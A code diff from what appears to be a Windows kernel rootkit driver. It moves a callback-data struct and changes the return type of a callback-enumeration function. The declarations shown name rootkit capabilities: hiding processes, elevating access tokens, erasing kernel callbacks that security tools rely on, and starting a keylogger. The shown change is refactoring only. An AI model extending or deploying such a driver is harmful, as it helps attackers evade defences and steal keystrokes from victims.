@@ -2,6 +2,13 @@
 
 #include <ntifs.h>
 #include <wdf.h>
+
+typedef struct _CALLBACK_DATA {
+    UINT64 driverBase;
+    UINT64 offset;
+    WCHAR driverName[64];
+} CALLBACK_DATA;
+
 #include "Globals.hpp"
 #include "ProcessUtils.hpp"
 #include "DriverMeta.hpp"
@@ -30,20 +37,12 @@ enum COMMAND_TYPE
 
 // --------------------------------------------------------------------------------------------------------
 
-typedef struct _CALLBACK_DATA {
-    UINT64 driverBase;
-    UINT64 offset;
-    WCHAR driverName[64];
-} CALLBACK_DATA;
-
-// --------------------------------------------------------------------------------------------------------
-
 NTSTATUS BeCmd_KillProcess(HANDLE pid);
 NTSTATUS BeCmd_ProtectProcess(ULONG pid, BYTE newProcessProtection);
 NTSTATUS BeCmd_ElevateProcessAcessToken(HANDLE pid);
 NTSTATUS BeCmd_KillProcess(HANDLE pid);
 NTSTATUS BeCmd_HideProcess(HANDLE pid);
-ktd::vector<KernelCallback, PagedPool> BeCmd_EnumerateCallbacks(CALLBACK_TYPE callbackType);
+ktd::vector<CALLBACK_DATA, PagedPool> BeCmd_EnumerateCallbacks(CALLBACK_TYPE callbackType);
 NTSTATUS BeCmd_EraseCallbacks(PWCHAR targetDriver, CALLBACK_TYPE cbType);
 NTSTATUS BeCmd_StartKeylogger(BOOLEAN start);
 
@@ -193,11 +192,11 @@ BeCmd_HideProcess(HANDLE pid)
  * @param type Type of callback to resolve
  * @returns ktd::vector<KernelCallback, PagedPool> Vector of callbacks
  */
-ktd::vector<KernelCallback, PagedPool>
+ktd::vector<CALLBACK_DATA, PagedPool>
 BeCmd_EnumerateCallbacks(CALLBACK_TYPE type)
 {
     NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
-    LOG_MSG("IOCTL enumerate callbacks\r\n");
+    LOG_MSG("Enumerate callbacks\r\n");
 
     return BeEnumerateKernelCallbacks(type);
 }
